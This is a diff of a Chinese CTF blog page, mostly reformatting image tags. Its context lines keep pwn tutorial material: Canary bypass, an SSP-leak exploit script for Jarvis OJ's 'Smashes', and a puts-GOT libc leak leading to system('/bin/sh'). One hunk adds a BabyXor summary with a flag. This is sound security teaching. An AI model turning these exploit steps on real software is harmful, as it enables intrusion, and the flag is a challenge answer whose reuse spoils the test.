@@ -507,11 +507,7 @@ putsputs函数嘛…我们的老常客..大部分漏洞都会用到它 需要注
 <p>编译指令: gcc -no-pie 输出文件名 源码名</p>
 </blockquote>
 <p>首先使用checksec查看一下保护</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Ha848a116c2fa44208a905701b54e09bbl.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/Ha848a116c2fa44208a905701b54e09bbl.png" alt></p>
 <p>确认和预先料想的一样 开启了Canary保护 载入IDA</p>
 <p>通过观察流程图 我们可以发现 在程序最后会校验 var_8 这个变量 如果变量和预先值不同 就触发 stack_chk_fail函数 至于这个函数的功能…看看名字就知道了啊喂… 通过这个我们就能了解 var_8变量储存的就是我们Canary值 要想通过栈溢出直接跳转到 sys函数拿到shell 就需要先泄漏出来它 </p>
 <p>通过阅读IDA的代码和栈图 我们可以明确得知程序的流程 main函数内部将会执行两次 且我们的输入是可以溢出到Canary值的 </p>
@@ -565,31 +561,15 @@ constchar<span class="token operator">*</span>msg<span class="token punctuation"
 <p>可以通过函数明确了解到 如果我们能控制argv[0]指针的位置 那我们就能输出任意值<br>而控制argv[0]的位置通常有两种方式 一种是暴力覆盖 因为其为一个变量 且通常为文件名 那么他就一定在栈上 通过栈溢出 直接覆盖全部栈为我们想要的地址 就一定会将argv[0]指针的值覆盖为我们想要的 还有一种就是计算偏移 因为其值为文件名 观察栈指定覆盖即可</p>
 <h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>这里使用 Jarvis OJ 的题目Smashes 进行演示</p>
 <p>首先checksec 查看保护</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Hbd06c905aa8946aa988f134913022d9bB.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/Hbd06c905aa8946aa988f134913022d9bB.png" alt></p>
 <p>发现开有Canary保护 不能直接进行ROP 载入IDA 发现没有任何能用于输出flag的方式 但是发现一个奇怪的字符串</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Hedb1c5785ce645b7820b506d8ff69021X.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/Hedb1c5785ce645b7820b506d8ff69021X.png" alt></p>
 <p>也就是说flag的地址就是这个地方 如果写出脚本能够输出这个位置的值 就能得到flag</p>
 <p>联系到SSP leak 我们可以故意触发stack_chk_fail函数 然后将指针指向这个地址就能利用报错信息输出flag了</p>
 <p>但是看到主函数的最后一句 发现这个位置的flag会在主函数返回之前就清除掉 这个时候就需要用到ELF的重映射了</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Hc3145c65c7a74b149a1db1c3b888bf83f.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/Hc3145c65c7a74b149a1db1c3b888bf83f.png" alt></p>
 <p>我们使用gdb 看看程序是否有flag的重映射</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H4a5f879530e04a619be0925cdc11a758s.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/H4a5f879530e04a619be0925cdc11a758s.png" alt></p>
 <p>发现在0x400d20处还映射的有flag 那么我们直接将0x400d20覆盖满整个栈即可</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'pwn.jarvisoj.com'</span><span class="token punctuation">,</span><span class="token number">9877</span><span class="token punctuation">)</span>
@@ -600,12 +580,7 @@ r<span class="token punctuation">.</span>sendline<span class="token punctuation"
 
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <p>运行脚本即可</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Ha99e3eabb7d447afa66ab934d84f2b12X.png" alt title class>
-                <p></p>
-            </figure>
-
-
+<p><img src="https://ae01.alicdn.com/kf/Ha99e3eabb7d447afa66ab934d84f2b12X.png" alt></p>
 <h2 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h2><blockquote>
 <p>这里先科普下libc是什么 以及泄漏libc有什么用</p>
 <p>可以直接将libc理解为是C的函数库 但是里面存的不是函数的具体地址 而是函数相对于libc基地址的偏移 </p>
@@ -684,11 +659,7 @@ sh.sendline('3')
 
 puts_got=u64(sh.recv(6).ljust(8,'\x00'))
 log.info("puts_got:"+hex(puts_got))</code></pre>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Hc2e83934915d427b915f9437089a01b0u.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/Hc2e83934915d427b915f9437089a01b0u.png" alt></p>
 <p>剩下就简单多了 计算基地址 计算system函数偏移 和/bin/sh偏移 然后调用即可</p>
 <pre class=" language-python"><code class="language-python">libc_base<span class="token operator">=</span>puts_got<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
 log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc_base:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
@@ -1058,13 +1029,11 @@ ROP存在的价值就是 当我
                     <div class="summary block-with-text">
                         
                             逆向BabyXor
-                
-                
-            
-
 有壳 且没有检测出具体壳的种类 使用ESP定律手动脱壳 
 
-已经脱掉壳了 载入dbg动态调试 单步跟几部之后发现在栈中存有f
+已经脱掉壳了 载入dbg动态调试 单步跟几部之后发现在栈中存有flag
+
+得到flag{2378b077-7d6e-4564-bdca-7eec8eede9a2
                         
                     </div>
                     <div class="publish-info">
@@ -1212,7 +1181,7 @@ ROP存在的价值就是 当我
             | Theme <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
             
-             <i class="fas fa-chart-area"></i> 站点总字数: <span class="white-color">17.7k</span> 字
+             <i class="fas fa-chart-area"></i> 站点总字数: <span class="white-color">19.5k</span> 字
             
             
             
